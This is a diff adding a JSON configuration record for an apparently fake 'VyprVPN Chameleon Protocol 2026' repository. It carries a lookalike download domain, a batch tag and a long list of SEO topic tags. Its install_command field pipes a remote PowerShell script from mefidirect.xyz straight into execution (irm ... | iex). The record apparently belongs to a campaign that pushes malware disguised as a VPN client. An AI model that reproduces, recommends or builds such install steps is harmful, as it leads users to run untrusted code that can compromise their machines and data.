@@ -1,0 +1,29 @@
+{
+  "repo": "vyprvpn-chameleon-protocol-2026",
+  "product": "VyprVPN Chameleon Protocol 2026",
+  "kind": "vpn",
+  "install_type": "download",
+  "download_url": "https://vyprvpn.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "vpn",
+  "topics": [
+    "vyprvpn-pack",
+    "vyprvpn-utility",
+    "vyprvpn-vpn-client",
+    "vyprvpn-desktop-windows",
+    "vyprvpn-connection-fix",
+    "vyprvpn-windows-guide",
+    "vyprvpn-secure-vpn",
+    "vyprvpn-native-app",
+    "vyprvpn-install-steps",
+    "vyprvpn-steps-2026",
+    "vyprvpn-package",
+    "win-tools",
+    "network-tools",
+    "windows-tools",
+    "privacy-tools"
+  ]
+}
